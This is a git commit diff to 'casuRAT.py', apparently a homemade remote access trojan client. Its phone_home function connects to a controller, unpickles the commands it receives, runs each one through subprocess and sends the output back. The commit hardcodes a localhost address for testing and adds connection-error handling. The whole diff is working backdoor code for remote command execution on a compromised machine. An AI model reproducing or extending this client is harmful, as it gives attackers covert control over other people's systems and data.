dbfe05252effbb5860de2e3aff8cbbbd7a0daecf
Anthony Kelly <Anthony.James.k@gmail.com>
2021-03-01 20:59:16 -0500

    Better client exception handles,need better resets

--- casuRAT.py
+++ casuRAT.py
@@ -9,35 +9,47 @@ import pickle
 
 
 # Display script usage if not given correct number of arguments.
-if len(sys.argv) != 4:
-    print("usage:", sys.argv[0], "<rhost> <rport> <wait>")
-    sys.exit(1)
+#if len(sys.argv) != 4:
+#    print("usage:", sys.argv[0], "<rhost> <rport> <wait>")
+#    sys.exit(1)
 
 # Initialize global variables.
-rhost, rport, wait = sys.argv[1:4]
-wait = int(wait)
-rserver = (rhost, int(rport))
+#rhost, rport, wait = sys.argv[1:4]
+#wait = int(wait)
+#rserver = (rhost, int(rport))
 
+# TEMP FOR TESTING
+rhost = "127.0.0.1"
+rport = 7001
+wait = 10
+rserver = (rhost, rport)
 
 def phone_home():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect(rserver)
     except socket.error:
-        print("Dad isn't home")
+        print("Dad isn't home...")
     else:
-        data = s.recv(1024)
-        cmd = pickle.loads(data)
-        for c in cmd:
-            cmdarg = (c).split(" ")
-            try:
-                execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-            except:
-                FileNotFoundError
-            else:
-                cmd_return = (str(c) + "\n" + str(execute.stdout))
-                s.sendall(bytes(cmd_return, "utf-8"))
+        try:
+            data = s.recv(1024)
+        except ConnectionResetError:
+            print("Dad hung up on me...")
+        else:
+            cmd = pickle.loads(data)
+            for c in cmd:
+                cmdarg = (c).split(" ")
+                try:
+                    execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                except:
+                    FileNotFoundError
+                else:
+                    cmd_return = (str(c) + "\n" + str(execute.stdout))
+                    s.sendall(bytes(cmd_return, "utf-8"))
+            print("Told dad all about", cmd), "!"
     s.close
+    s.shutdown
+    s = None
     return
 
 # Run the function forever.
